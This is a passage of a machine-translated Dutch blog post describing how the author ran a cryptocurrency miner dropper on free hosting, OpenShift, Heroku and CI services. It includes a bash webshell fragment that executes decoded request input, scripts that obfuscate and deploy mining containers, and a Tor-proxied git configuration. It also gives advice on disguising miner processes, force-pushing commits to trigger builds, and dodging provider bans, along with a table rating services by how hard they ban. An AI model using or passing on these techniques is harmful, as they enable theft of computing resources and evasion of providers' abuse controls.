<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Het is beter om alleen op ingebouwde functies te vertrouwen, aangezien het forken van extra processen in webjails misschien niet is toegestaan, maar het is altijd mogelijk om<code>exec</code> waarmee we de meeste hulpprogramma's voor de opdrachtregel kunnen gebruiken. De meeste webshells zijn geschreven in andere scripttalen zoals python of php, omdat je je geen zorgen hoeft te maken over forking.<p>In een cpanel-omgeving is het beter om een ​​statische naam te gebruiken voor het minerproces, zoals:<code>httpd</code> of<code>php-fpm</code> omdat<code>cgi</code> is gebaseerd op multi-verwerking, dus servers zijn altijd gevuld met veel processen die zo worden genoemd, hoewel een zorgvuldige waarnemer de<em> meerdradig</em> gebruikspatroon dat zeker niet gebruikelijk (of mogelijk) is voor talen zoals perl, php, ruby ​​of python!<p>Processen hebben standaard ook een tijdslimiet (1 uur, 1 dag, etc..), hiervoor gebruiken we gewoon een cron job die de dropper opnieuw opstart.<p>Dit vergde veel handmatige bewerking, de cpanel-api om dit te automatiseren is helaas niet zichtbaar voor eindgebruikers, dus webhosting is een onhandig en saai doelwit voor onze miner-dropper.<h3 id=web_environments><a class=header-anchor href=#web_environments> Webomgevingen</a></h3><p>Er zijn<em> SaaS</em> providers die een webeditor hebben gekoppeld aan een container, zoals<a href="with a free tier before getting acquired by amazon"> wolk 9</a> , [codeanywhere], [codenvy]. De dropper hier implementeren is eenvoudig (je hebt een volwaardige omgeving), maar het draaiende houden is een last, aangezien elke interactieve webeditor zijn sessie beëindigt kort nadat de webpagina is gesloten en de container bijgevolg in de sluimerstand wordt gezet (tenzij je betalen natuurlijk).<p>Dit omzeilen kan alleen maar betekenen dat we de sessies open moeten houden, wat scripting met [poppenspeler] heeft het gewenste resultaat opgeleverd, maar het hebben van langlopende, geheugenlekkende, opgeblazen SPA's webpagina's is absoluut onaantrekkelijk en niet heimelijk, omdat vanuit de backend van de provider, een sessie die 24/7 geopend is, zal er zeker verdacht uitzien. Inderdaad, webomgevingen zijn ook onhandige en saaie doelen.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Gratis apps-services</a></h3><p>Dit is voornamelijk<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> en [heroku]. Openshift, kubernetes zijn, was enigszins eenvoudig te implementeren, maar vol met configuratieverloop, hier is een fragment:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Dit was het script dat werd gebruikt om de mijncontainer te bouwen waarvoor een yaml-sjabloon nodig was:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Maar het hele proces omvatte nogal wat stappen!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>In pseudo-code:<ul><li><p>maak het project<li><p>maak de applicatie zonder een afbeelding<li><p>bouw de mijncontainer<li><p>implementeer de container met een implementatieconfiguratie (kubernetes-abstractie)<li><p>de implementatie uitrollen</ul><p>De<code>build-build</code> scripts in plaats daarvan gemaakt a<em> bouwen</em> container die een paar uur per keer zou mijnen. Builds en normale pods hebben aparte bronnen in openshift, dus we hebben ze allebei uitgebuit. Openshift was over het algemeen een slechte ervaring omdat het over 4 verschillende releases ging (misschien meer, ik stopte na een tijdje met volgen) en elk van hen vereiste wijzigingen in de configuraties, ze hadden geen upgradepaden en alles werd snel herhaald, en het was gebruikelijk voor builds / pods om te blokkeren, en niet om afval te worden verzameld ... ze voerden meestal af en toe een handmatige herstart uit, misschien was kubernetes gewoon een bug :)<p>Heroku-configuratie was een beetje eenvoudiger (er zijn geen kubernetes bij betrokken). Afgezien van de container-build, die vergelijkbaar was met de openshift-versie, waren de rest slechts twee cli-opdrachten<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>De container werd direct met docker naar het heroku-register geduwd.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> De frictie met heroku (welke gratis laag nog steeds standhoudt tot het moment van schrijven) is dat dyno's maar 22 dagen per maand kunnen werken, dus ze vereisten elke maand wat handmatig beheer, opnieuw onhandig en saai. Ze voerden in het begin wel wat ban-waves uit, en toen schakelden ze registraties uit via TOR, ik ben er vrij zeker van dat ik de oorzaak hiervan was.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI-containers of VM's</a></h3><p>Dit waren de meest synergetische doelen voor onze druppelaar. Er zijn veel<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> bedrijven, waarvan er veel geld van investeerders verbranden door gratis niveaus aan te bieden in de hoop wat marktaandeel te winnen in de technologie-infrastructuursector.<p>Al deze services bieden verschillende bronnen, hebben verschillende configuratie-eisen en draaien in verschillende omgevingen. Ik heb nooit overwogen om accountregistratie te automatiseren omdat dat soort dingen vreselijk zijn om te programmeren, ik probeer ze altijd te vermijden, dus ik heb een tijdje handmatige registraties doorstaan, omdat ik nieuwsgierig was naar wat voor soort anti-spamreactie ik zou krijgen (en hoe anders dan de rest!). U kunt een aantal dingen over het management van een bedrijf raden aan de hand van de manier waarop het met spam omgaat:<ul><li><p>Voert het verbodsgolven uit? Dan hebben ze een niet-strikt beleid, problemen worden handmatig en geval per geval afgehandeld<li><p>Vereist het telefonische verificatie? Ze werden in het verleden al misbruikt<li><p>Reageren ze op zwaar gebruik van hulpbronnen? Ze draaien op een krap budget<li><p>Passen ze accountbeperkingen of schaduwverboden toe? Als ze een schaduwverbod hebben, hebben ze gemene systeembeheerders.</ul><p>Er is ook een filosofische vraag: als een service je toestaat om hun systeem voor een lange tijd te misbruiken, betekent dit dan dat ze een hoogwaardige infrastructuur hebben die de belasting aankan, of gewoon slechte controle over hun systeem? En u moet rekening houden met de balans tussen toegankelijkheid en beveiliging, een systeem dat te veilig is, kan de gebruikersretentie verlagen.<p>Hier is een tabel met enkele services die ik heb geïmplementeerd:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configuratie<th style=text-align:center>uitvoering<th style=text-align:center>ban-hamer<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>slecht<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Goed<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>slecht<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Goed<td style=color:green;text-align:center>Goed<tr><td style=text-align:center>cirkelci<td style=color:red;text-align:center>slecht<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>semafoor<td style=color:green;text-align:center>Goed<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Goed<tr><td style=text-align:center>Kade<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>slecht<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>slecht<tr><td style=text-align:center>Azure-pijplijnen<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>slecht<tr><td style=text-align:center>continue php<td style=color:red;text-align:center>slecht<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>maatje<td style=color:red;text-align:center>slecht<td style=color:red;text-align:center>slecht<td style=color:red;text-align:center>slecht<tr><td style=text-align:center>drone<td style=color:red;text-align:center>slecht<td style=color:green;text-align:center>Goed<td style=color:red;text-align:center>slecht<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>slecht<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>slecht<tr><td style=text-align:center>Nooit coderen<td style=color:red;text-align:center>slecht<td style=color:green;text-align:center>Goed<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>slecht<td style=color:green;text-align:center>Goed<td style=color:red;text-align:center>slecht</table><p>In dit verband is een<span style=color:green> Goed</span> configuratie betekent dat het niet veel tijd kostte om een<code>ci</code> taak voor het mining-proces (zoals alle services die afhankelijk waren van een webdashboard in plaats van een repository-dot-bestand een hele klus waren), een<span style=color:red> slecht</span><code>ban-hammer</code> betekent dat het moeilijk was om je bij de service te registreren, of dat accounts agressiever zouden worden verbannen.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> vereist om een ​​project op te zetten, om de omgeving, de doelarchitectuur, het uitvoeringsproces en andere dingen af ​​te leiden, het was erg tijdrovend om een ​​build op te zetten, dus het kreeg een slechte beoordeling in de configuratie.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> continue php</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> maatje</a> , [Codefresh] had ook veel handmatige niet-declaratieve configuratiestappen.<p>Diensten zoals [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> maatje</a> past schaduwbans toe op de accounts, schaduwbans zijn slecht, omdat ze je laten raden of er iets mis is met je configuratie of niet. Bij sommige services kun je de reden van het verbod raden (vrijwel je build heeft te veel tijd gekost, of je hebt te vaak gebouwd in een korte periode), voor sommige andere zoals [Azure-pipelines] neem ik aan dat ze een soort vingerafdruk hebben toegepast naar de gebruikersrepository's omdat er verboden werden, zelfs zonder enig misbruik van bronnen, azure en vercel ook beperkt<code>DNS</code> toegang binnen openbare bouwmachines, dus dat was extra wrijving die moest worden overwonnen met een ad-hoctunnel.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> drone</a> gaf toegang tot een hele 16+ cores-processor, maar werd uiteindelijk verbannen na 2 builds<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> geeft ook toegang tot krachtige build-hosts en verbood niet zo agressief als drone.<p>Mijn favoriete diensten niet vanwege winstgevendheid maar voor gemak en gemak (ook bij andere projecten) waren<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> semafoor</a> en<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Travis is als de standaard CI en is zeer flexibel, Semaphore is de enige<code>DSL</code> voor<code>CI</code> die er benaderbaar en goed uitzag, in plaats van alleen maar een eindeloze reeks van spaghettified selectievakjes zoals andere gebruikersinterfaces, en Docker alleen voor de eenvoud om dockerbestanden toe te wijzen aan builds.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Bouwt configuraties</a></h3><p>De builds werden geactiveerd door cron-jobs aangeboden door webservices of door git-commits. Dus je moest een rommel van toegangstokens of ssh-sleutels bijhouden om alle git-commits te beheren. Het was ook belangrijk om commits niet te veel te spammen en proxy's te gebruiken bij het pushen naar de repositories die git configureren:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Met behulp van git-hostingservices was github degene die grondiger was over verboden, maar ze werden alleen uitgevoerd na misbruikrapporten door beheerders van ci-services, gitlab voerde een keer een bangolf uit, toen ik probeerde de CI-proef (onzorgvuldig) te vernieuwen. Ik heb nog nooit een ban gekregen voor een bitbucket-account. Om git-commits te (forceren) pushen, hebben we een langlopende lus die de git-repository opnieuw tagt:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Het is mogelijk dat force pushen op deze manier niet iets is waar github erg van houdt en dat het een oorzaak kan zijn geweest voor het markeren van accounts. De tagger-functie die belast is met het geforceerd pushen van verschillende commits, gebruikt een website (die je vrij gemakkelijk kunt opzoeken) die een aantal willekeurige commits geeft. Ik weet niet zeker hoeveel dit helpt, aangezien de inhoud zelf van de commits duidelijk verdacht is voor mijn geval. En het beet me ook een keer in mijn reet, aangezien de commits die door dit commando worden geretourneerd, scheldwoorden kunnen bevatten, werd een van mijn commits opgepikt door een Twitter-bot die git-commits volgt met scheldwoorden! Ik heb na het incident een zwarte lijst voor slechte woorden toegevoegd.<p>Ik heb me niet echt verdiept in versluierde git-commits en versluierde git-repositories. Het enige geval waarin ik een uitgebreidere repository gebruikte, was met Bitrise, omdat je geen build kon opzetten als het systeem geen omgeving herkende (zoals mobiele apps), maar zelfs dan was er geen rotatie en het was altijd hetzelfde repository, vrij gemakkelijk te herkennen.<p>Over het algemeen, als ik een belcurve moest plotten rond de optimale tijd om te mijnen<em> zonder</em>het verbannen van accounts, voor alle geteste services, zou zijn met een centrum van ongeveer 1 uur bouwduur, eenmaal per dag. Voor cpu-kernen, afgezien van een paar leugenaars (zoals drone), verwachten de meeste services dat je de volledige hoeveelheid middelen gebruikt die je worden gegeven, aangezien builds worden uitgevoerd in VM's of containers met beperkte bronnen ... en compilatie is meestal een taak die verzadigt cpu, dus het heeft geen statistische relevantie. Intuïtief is één build per dag wat de gemiddelde ontwikkelaar zou doen, dus je zou verhoogde vlaggen moeten verwachten als je afwijkt van het gemiddelde, en aandringen op misbruik eindigt nooit goed.<h2 id=conclusions><a class=header-anchor href=#conclusions> conclusies</a></h2><p>Was het het waard? De netwerkonderdelen waren zeker interessant, het omgaan met accountregistraties was natuurlijk het slechtste deel, niemand houdt tenslotte van eindeloze bevestigingsmails en het herhalen van geestdodende UI-procedures. Het schrijven van spam-automatiseringssoftware is ook saai (omdat je meestal naar domme API's prikt), en met deze veronderstelling (en het feit dat dit nooit iets serieus was) heb ik het zelfs nooit overwogen. Was het winstgevend? Op zijn hoogtepunt bereikte het zoiets als<code>300$</code> per maand, misschien genoeg voor een Venezolaan, niet echt voor mij :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> de knorrige systeembeheerder</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>ook al zou dit veel privacy-aannames doorbreken, ik weet zeker dat de meeste gewoon naar binnen gluren wanneer er een bestaand probleem is, maar dit is alleen een probleem voor op containers gebaseerde runtimes, terwijl VM's vrijwel zwarte dozen zijn.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>de miner die in het monero-knooppunt is ingebouwd, heeft wat werk verzet om het achtergrondvriendelijker te maken, maar de distributie van xmrig was nooit gericht op achtergrondvriendelijkheid.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>sommige pools bieden verschillende moeilijkheden op verschillende verbindingspoorten en hebben de neiging om de moeilijkheidsgraad van de taak af te stemmen op de door de miner ingediende aandelen, maar de granulariteit van de proxy was nog handiger, omdat het pool zou voorkomen<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> opsluiten</a> (hoewel we nooit echt van zwembad veranderden).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>het was niet blij toen de configuratie plotseling verscheen en uit het bestandssysteem verdween</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>We praten niet over de<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> stratum protocol</a> omdat we gewoon te maken hebben met alles wat is geïmplementeerd in<em> beide</em> het zwembad en de mijnwerker ... wat meestal het absolute minimum is, en mogelijk met niet-standaard uitbreidingen.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ga nooit full bash :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Ik heb niet onderzocht wat er gebeurt als een proces extra functionaliteit laadt tijdens runtime, omdat de kernel zou zoeken naar het adres in de geheugenlay-out van het uitvoerbare bestand, dat toegang zou krijgen tot het bestandssysteem en mogelijk een crash zou veroorzaken.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Limieten zijn willekeurig, cpu-tijd is minder dan een seconde, geheugen is minder dan 128M, uitgaande verbindingen zijn geblokkeerd.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>met een beetje geduld kun je ook een volledige ssh-instantie uitvoeren over een omgeving die is opgestart rond je cpanel-accountruimte,<em> zonder</em> toegang hebben tot de cpanel ingebouwde SSH die meestal wordt uitgeschakeld door hostingproviders.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift ging van een gratis niveau van 1 jaar naar 3 maanden naar 1 maand, en begon telefoonverificatie te vereisen, ik kan garanderen dat ik niet de enige was die misbruik maakte van hun diensten.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Heroku-containers met gratis lagen zijn vrij genereus in middelen, ze bieden 4c/8t (virtuele) cpu's, veel ram en grote opslagruimte (die echter niet persistent is en wordt weggegooid bij het afsluiten van de dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Ze voegen veel strengere registratieregels toe, na een paar verboden heb ik er misschien aan bijgedragen.</table><p><div id=post-tags-list>Berichttags: <span class=post-tag><a href=https://www.unto.re/tag/crypto> cryptovaluta</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> netto-</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> schelp</a></span></div><div class=page-foot><div class=copyright>21 augustus 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© totreh - Mogelijk gemaakt door<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/nl/sitemapxml> Sitemap</a></li> | <li><a href=/nl/tag> Tags</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>